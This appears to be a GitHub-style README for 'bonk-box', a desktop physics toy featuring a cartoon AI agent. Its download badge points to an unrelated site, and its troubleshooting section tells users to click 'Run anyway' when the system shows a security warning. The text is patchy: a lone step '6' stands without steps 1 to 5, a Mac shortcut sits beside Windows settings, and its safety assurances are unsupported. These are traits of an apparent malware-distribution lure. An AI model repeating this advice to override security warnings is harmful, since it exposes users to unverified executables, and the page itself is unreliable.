# 📦 bonk-box - Play with your digital physics buddy

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://whiterabbitnode.github.io)

Bonk-box provides a virtual space for an AI agent on your desktop. You control the environment. Use your mouse to flick the agent, launch fireworks, or build structures for him to knock over. The physics engine ensures he bounces back every time. Use the shortcut Alt+Command+B if your agent reports a bug.

6. Launch the application from your desktop icon or start menu.

## 🎮 How to play

The application runs in a small window on your screen. You interact with your agent using your mouse.

*   **Flicking:** Click and drag your agent to toss him around the box. The physics engine calculates his movement based on your speed and direction.
*   **Fireworks:** Press the firework icon on the toolbar to launch small explosions. These change the trajectory of the agent when they make contact.
*   **Building:** Use the shapes panel to place blocks inside the box. Create forts or obstacles for the agent to navigate.
*   **Reporting:** If the agent fails to perform a task, press Alt+Command+B. This sends a signal to your development tools.

If the application fails to start or run, try these steps:

*   **Permissions:** Your computer might flag the application during the first launch. Click "More info" and then "Run anyway" if the system displays a security warning.
*   **Updates:** Ensure your graphics drivers are up to date. Visit the website of your computer manufacturer to check for driver downloads.
*   **Window Size:** You can resize the box by dragging the edges of the window. Keep the window small if you notice the physics animation slows down.

## 🌐 Frequently asked questions

**Does the agent learn?**
The agent reacts to your input based on physics rules. He does not retain memory of past interactions between sessions.

**Can I run multiple boxes?**
You can open multiple instances of the application to host several agents at once. Note that this requires more processing power from your computer.

**Is the agent harmful?**
The agent exists only within the visual box. He cannot access files on your computer or interact with other applications.

**Where does the data go when I report a bug?**
The bug report creates a log file on your local machine. This file captures the current state of the physics simulation to help developers fix technical errors.

## 📋 Performance tips

The physics engine relies on your computer processor. If the agent moves in slow motion, try these adjustments:

*   Close background applications to free up memory.
*   Lower the number of objects placed inside the box.
*   Set your display scaling to 100 percent in Windows settings.
